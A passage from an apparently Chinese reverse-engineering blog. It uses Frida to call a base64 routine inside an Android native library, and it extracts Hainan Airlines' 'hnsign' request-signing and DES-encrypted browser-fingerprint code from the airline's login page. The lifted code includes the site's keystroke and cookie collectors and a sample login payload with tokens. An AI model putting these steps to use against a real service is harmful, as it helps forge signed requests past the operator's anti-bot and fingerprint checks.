)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = v11++;</span><br><span class="line">        out[v4] = byte_16FC4[(<span class="number">16</span> * (v10 &amp; <span class="number">3</span>)) | (v9 &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        out[v11] = byte_16FC4[(<span class="number">4</span> * (v10 &amp; <span class="number">0xF</span>)) | (v9 &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">        v5 = v11 + <span class="number">1</span>;</span><br><span class="line">        v11 += <span class="number">2</span>;</span><br><span class="line">        out[v5] = byte_16FC4[v9 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      out[v3] = byte_16FC4[v9 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( len % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    out[v11] = byte_16FC4[<span class="number">16</span> * (v9 &amp; <span class="number">3</span>)];</span><br><span class="line">    out[v11 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">    result = out;</span><br><span class="line">    out[v11 + <span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">char</span> *)(len % <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( len % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      out[v11] = byte_16FC4[<span class="number">4</span> * (v9 &amp; <span class="number">0xF</span>)];</span><br><span class="line">      result = out;</span><br><span class="line">      out[v11 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、查看代码，可以看到byte_16FC4参数，对应内容是一个标准的base64编码表</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161746200.png" alt="image.png"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161747749.png" alt="image.png"></p><p>到这块就可以大胆猜测一下，当前算法为base64了，因为base64的参数因子是该编码的一个特征。</p><p>哪怕有的base64编码做了魔改，其实本质也大都是修改<strong>参数因子</strong>的内容！</p><p>2、对比上面写的C代码，是将switch转换成了一个多层的if判断</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161748467.png" alt="image.png"> </p><p>剩下的就不具体分析了，略略略~</p><h1 id="frida-so入门"><a href="#frida-so入门" class="headerlink" title="frida so入门"></a>frida so入门</h1><p>上面的so代码是没有做符号抽取的，所以可以看到对应的函数名字。要是做了符号抽取，函数名是不可被直接识别的。</p><p>所以，当判断一个so层的函数可能实现了特定功能的时候，可以调用frida来实现主动调用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">base64_enc</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&#x27;libnative-lib.so&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> func_addr = base.<span class="title function_">add</span>(<span class="number">0x8E85</span>) ; <span class="comment">//0x8E84是函数的偏移地址，+1是为了跳过Thumb指令</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(func_addr,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>])  <span class="comment">//声明函数，第一个参数是函数地址，第二个参数是函数返回值类型，第三个参数是函数参数类型</span></span><br><span class="line">    <span class="keyword">var</span> arg1 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">100</span>) <span class="comment">//分配内存，用于存放输入的字符串</span></span><br><span class="line">    <span class="title function_">ptr</span>(arg1).<span class="title function_">writeUtf8String</span>(data) <span class="comment">//向内存中写入输入的字符串</span></span><br><span class="line">    <span class="keyword">var</span> arg3 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">100</span>) <span class="comment">//分配内存，用于存放输出的base64字符串</span></span><br><span class="line">    <span class="title function_">func</span>(arg1,data.<span class="property">length</span>,arg3) <span class="comment">//调用函数，第一个参数是输入的字符串地址，第二个参数是输入的字符串长度，第三个参数是输出的base64字符串地址</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">ptr</span>(arg3).<span class="title function_">readCString</span>() <span class="comment">//读取输出的base64字符串</span></span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">//返回base64字符串</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、查找函数基址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var base = Module.findBaseAddress(&#x27;libnative-lib.so&#x27;);</span><br><span class="line">var func_addr = base + 0x8E84 + 1; //0x8E84是函数的偏移地址，+1是为了跳过Thumb指令</span><br></pre></td></tr></table></figure><p>通过Module.findBaseAddress获取so文件的基址，再查找到函数的偏移地址。</p><p>然后还需要判断当前指令集是thumb的还是arm的。判断步骤如下：</p><p>（1）Option-&gt;Gereral-&gt;设置字节大小为4</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750656.png" alt="image.png"> </p><p>（2）查看函数中的地址，如果全部为4字节的话，为arm指令集；如果含有2个字节，则为thumb指令集，thumb指令集在查找函数基址时要+1</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750054.png" alt="image.png"> </p><p>2、最终执行结果如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750989.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> 算法还原 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海南航空hnsign逆向</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BAhnsign%E9%80%86%E5%90%91/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BAhnsign%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：海南航空hnsign逆向</li><li>链接：<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>简介：签名算法：通常签名有一个对象组合的操作，字符串拼接的操作，然后再对这个对象属性或字符串进行一个排序，组合的代码，看不懂，最方便的方式调试，拿到它组合后的结果。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648957.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><p>跟进这个加密函数中，可以发现依旧是webpack：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648859.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a.default._makeSign(null, c, p, null, n)</span><br></pre></td></tr></table></figure><p>找到定义对象 “a” 的地方，向上翻，找到如下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = E(n(38195))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648160.png" alt="image.png"> </p><h2 id="1、扣取启动器"><a href="#1、扣取启动器" class="headerlink" title="1、扣取启动器"></a>1、扣取启动器</h2><p>正常方法，在函数 n 处，下断点，定位到启动器位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101650788.png" alt="image.png"> </p><p>改写后，启动器如下：（和前面password的一样）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//模块</span></span><br><span class="line">  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2、扣取加密模块"><a href="#2、扣取加密模块" class="headerlink" title="2、扣取加密模块"></a>2、扣取加密模块</h2><p>这块第一个扣取的模块为 “<strong>38195</strong>”</p><p>然后依次根据提示，缺少什么模块就扣取什么</p><p>如果扣取过程中有出现报报错，那就解决报错。</p><p>加载模块比较多，扣取代码都要好久~~~</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101651366.png" alt="image.png"> </p><h2 id="3、自定义加密函数"><a href="#3、自定义加密函数" class="headerlink" title="3、自定义加密函数"></a>3、自定义加密函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Spring</span> = <span class="title function_">_b</span>(<span class="number">38195</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  c = <span class="string">&#x27;&#123;&#125;&#x27;</span>,</span><br><span class="line">    p = <span class="string">&#x27;&#123;&quot;sname&quot;:&quot;Win32&quot;,&quot;sver&quot;:&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;,&quot;schannel&quot;:&quot;HTML5&quot;,&quot;caller&quot;:&quot;HTML5&quot;,&quot;slang&quot;:&quot;zh-CN&quot;,&quot;did&quot;:&quot;97f572851c0ce1eb&quot;,&quot;stime&quot;:1696338450273,&quot;szone&quot;:-480,&quot;aname&quot;:&quot;com.hnair.spa.web.standard&quot;,&quot;aver&quot;:&quot;9.0.0&quot;,&quot;akey&quot;:&quot;9E4BBDDEC6C8416EA380E418161A7CD3&quot;,&quot;abuild&quot;:&quot;45469&quot;,&quot;atarget&quot;:&quot;standard&quot;,&quot;slat&quot;:&quot;slat&quot;,&quot;slng&quot;:&quot;slng&quot;,&quot;gtcid&quot;:&quot;defualt_web_gtcid&quot;,&quot;riskToken&quot;:&quot;651abaafiQI4S3rKQfX7DXPlLlrGKPBuW2iBlSJ1&quot;,&quot;captchaToken&quot;:&quot;&quot;,&quot;number&quot;:&quot;15888888888&quot;,&quot;pin&quot;:&quot;JwWZ9E/1ZByN8jrtlHnMhJpNaELFx0rZ3iQgeqCMIaYS2sfOgDvofgDSvowAO5yUM9i8shhYV/KlViMgwrtMdAfSZgpTvUzETQrrPgf2nCdA+7sh+sWGSEQKTlCwzom67NNkEqqzO1QPUbJJa5XlNjKTa8obqdvZ9dbs/kF/tWE=&quot;,&quot;toSave&quot;:true&#125;&#x27;</span>,</span><br><span class="line">    n = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeSign</span>(<span class="params">c,p,n</span>)&#123;</span><br><span class="line">    c = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(c)</span><br><span class="line">    p = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Spring</span>.<span class="title function_">_makeSign</span>(<span class="literal">null</span>, c, p, <span class="literal">null</span>, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101651670.png" alt="image.png"> </p><h1 id="三、完整代码"><a href="#三、完整代码" class="headerlink" title="三、完整代码"></a>三、完整代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略略略</span><br><span class="line">~~~</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> 验签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海南航空Desc补环境</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BADesc%E8%A1%A5%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BADesc%E8%A1%A5%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：海南航空Desc补环境初探</li><li>链接：<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>简介：浏览器指纹，补环境初探</li></ul><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101635232.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><h2 id="1、定位desc加密位置"><a href="#1、定位desc加密位置" class="headerlink" title="1、定位desc加密位置"></a>1、定位desc加密位置</h2><p>搜索关键字 “desc&#x3D;”，有两处位置，都打上断点，成功定位到了加密位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101636163.png" alt="image.png"> </p><p>可以看到这块的 U 就是加密后的 desc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var u = function() &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            return (new born).getCiphertext()</span><br><span class="line">                        &#125; catch (e) &#123;</span><br><span class="line">                            return null</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101637632.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return (new born).getCiphertext()</span><br></pre></td></tr></table></figure><h2 id="2、加密函数分析"><a href="#2、加密函数分析" class="headerlink" title="2、加密函数分析"></a>2、加密函数分析</h2><p><strong>1）跟进定义的对象 born 中，发现只是定义了这个对象里面没有任何属性和方法</strong></p><p>猜测可能是这个类的   构造方法&#x2F;原型对象  中有定义相关内容。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101638100.png" alt="image.png"> </p><p><strong>2）所以，直接跟进(new born).getCiphertext这个方法中 ，发现了如下代码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">born.prototype = &#123;</span><br><span class="line">    getCiphertext: function() &#123;</span><br><span class="line">        return ciphertext</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640855.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640299.png" alt="image.png"> </p><p>这块是直接返回了一个 “ciphertext” ,也没有调用任何函数。所以猜测这个 “ciphertext” 可能是个全局变量</p><p><strong>3）所以，在当前JS中搜索一下关键字  “ciphertext” ，找到5处，都打上断点，看看会断在哪儿</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640538.png" alt="image.png"> </p><p>但是，点击【登录】后，发现并没有断下，这是为啥你？？？？</p><p>这是因为，desc表示的是浏览器的指纹信息，并且将其定义为了全局变量，猜测可能是在页面加载的时候就定义好了已经。所以，我们刷新页面，成功断下：</p><p>这块是将 “t” 赋值给了 “ciphertext”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101641949.png" alt="image.png"> </p><p><strong>4）向前跟栈，找到定义参数 t 的位置：</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101641107.png" alt="image.png"> </p><p>这块可以判断处当前加密为 DES加密方式。</p><p><strong>5）这个函数传入了两个参数 e 和 t</strong></p><p>向前继续跟栈，找到了这两个参数的定义处：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var fingerprint = (new referFingerprint).get();</span><br><span class="line">window[_hqjl(&quot;rzKroleD&quot;, 3, 3)] = function(e) &#123;</span><br><span class="line">    mcArrs.ex_mouse(e);</span><br><span class="line">    var t = &#123;</span><br><span class="line">        xy: mcArrs,</span><br><span class="line">        fingerprint: fingerprint</span><br><span class="line">    &#125;</span><br><span class="line">      , r = JSON.stringify(t)</span><br><span class="line">      , n = eq_u(r, zznu(zre));</span><br><span class="line">    window[coyp](_hqjl(&quot;ycrtrehpixext\\&quot;, 7, 2) + &quot;=&#x27;&quot; + n + &quot;&#x27;&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642402.png" alt="image.png"> </p><p>①第一个参数r：</p><p>暴力扣取JS，将这个函数之前的待JS全部扣取下来，测试，成功拿到参数r的值</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642501.png" alt="image.png"> </p><p>②第二个参数 zznu(zre) </p><p>这块就只需要将 zznu 这个函数扣取下来即可：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642328.png" alt="image.png"> </p><p>然后是zre这个变量值：</p><p>暂时没有找到是在哪儿定义的，先不管了！</p><p><strong>6）扣取JS并测试</strong></p><p>有一些小坑，但是可以暴力一点，将整个JS都扣取下来，然后哪块报错就删除哪块：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101643274.png" alt="image.png"> </p><h1 id="三、完整代码"><a href="#三、完整代码" class="headerlink" title="三、完整代码"></a>三、完整代码</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="number">0</span></span><br><span class="line">      , r = <span class="number">0</span></span><br><span class="line">      , e = e || event;</span><br><span class="line">    t = e.<span class="property">keyCode</span> || e.<span class="property">which</span> || e.<span class="property">charCode</span>,</span><br><span class="line">    r = t &gt;= <span class="number">65</span> &amp;&amp; <span class="number">90</span> &gt;= t,</span><br><span class="line">    z = t &gt;= <span class="number">97</span> &amp;&amp; <span class="number">122</span> &gt;= t,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">keydown</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = e || event</span><br><span class="line">      , t = e.<span class="property">keyCode</span> || e.<span class="property">which</span> || e.<span class="property">charCode</span></span><br><span class="line">      , r = t;</span><br><span class="line">    t &gt; <span class="number">7</span> &amp;&amp; <span class="number">14</span> &gt; t || <span class="number">20</span> == t || <span class="number">91</span> == t || <span class="number">16</span> == t || <span class="number">17</span> == t || <span class="number">222</span> == t || t &gt; <span class="number">31</span> &amp;&amp; <span class="number">47</span> &gt; t || t &gt; <span class="number">111</span> &amp;&amp; <span class="number">124</span> &gt; t ? (e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? r = <span class="string">&quot;CTRL+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;ALT+&quot;</span> + r : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;SHIFT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r),</span><br><span class="line">    <span class="string">&quot;&quot;</span> != r &amp;&amp; mcArrps.<span class="title function_">push</span>(r)) : <span class="variable language_">window</span>.<span class="property">ActiveXObject</span> &amp;&amp; -<span class="number">1</span> != navigator.<span class="property">appVersion</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;Windows&quot;</span>) ? (r = t,</span><br><span class="line">    e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? r = <span class="string">&quot;CTRL+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;ALT+&quot;</span> + r : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;SHIFT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r),</span><br><span class="line">    <span class="string">&quot;&quot;</span> != r &amp;&amp; mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? (r = <span class="string">&quot;CTRL+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? (r = <span class="string">&quot;ALT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? (r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">del_html_tags</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="keyword">new</span> <span class="title class_">RegExp</span>(t,<span class="string">&quot;g&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> words = e.<span class="title function_">replace</span>(n, r),</span><br><span class="line">    words</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getScriptPaths</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e, t = <span class="variable language_">document</span>.<span class="property">scripts</span>, r = t.<span class="property">length</span>; r &gt; <span class="number">0</span>; r--)</span><br><span class="line">        t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;ex_mouse.js&quot;</span>) &gt; -<span class="number">1</span> &amp;&amp; (e = t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">substring</span>(<span class="number">0</span>, t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBroClient</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="keyword">new</span> <span class="title function_">referFingerprint</span>(&#123;</span><br><span class="line">        <span class="attr">canvas</span>: !<span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">      , t = <span class="built_in">parseInt</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>() / <span class="number">1e3</span>)</span><br><span class="line">      , r = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span> &amp;&amp; (r.<span class="property">dc_domain</span> = <span class="variable language_">document</span>.<span class="property">domain</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_url</span> = <span class="variable language_">document</span>.<span class="property">URL</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_title</span> = <span class="variable language_">document</span>.<span class="property">title</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_referrer</span> = <span class="variable language_">document</span>.<span class="property">referrer</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_cookies</span> = <span class="variable language_">document</span>.<span class="property">cookie</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_websign</span> = e.<span class="title function_">get</span>() || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_arrtime</span> = t || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_officeXY</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availWidth</span> + <span class="string">&quot;x &quot;</span> + <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availHeight</span> + <span class="string">&quot;y&quot;</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_coloriDepth</span> = broClient.<span class="title function_">coloriDepth</span>(<span class="variable language_">window</span>.<span class="property">navigator</span>) || <span class="string">&quot;&quot;</span>),</span><br><span class="line">    <span class="variable language_">window</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">screen</span> &amp;&amp; (r.<span class="property">sh</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">height</span> || <span class="number">0</span>,</span><br><span class="line">    r.<span class="property">sw</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">width</span> || <span class="number">0</span>,</span><br><span class="line">    r.<span class="property">cd</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">colorDepth</span> || <span class="number">0</span>),</span><br><span class="line">    navigator &amp;&amp; (r.<span 